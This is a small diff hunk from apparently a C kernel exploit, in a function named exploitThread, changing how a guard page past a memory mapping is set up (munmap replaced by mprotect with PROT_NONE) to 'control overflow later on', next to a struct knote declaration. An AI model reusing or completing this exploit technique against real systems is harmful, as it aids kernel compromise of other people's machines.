@@ -85,7 +85,7 @@ void *exploitThread(void *none)
 
 	// Map address to control overflow later on
 	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-	munmap(mapping + mappingSize, PAGE_SIZE);
+	mprotect(mapping + mappingSize, PAGE_SIZE, PROT_NONE);
 
 	// Create structures
 	struct knote kn;
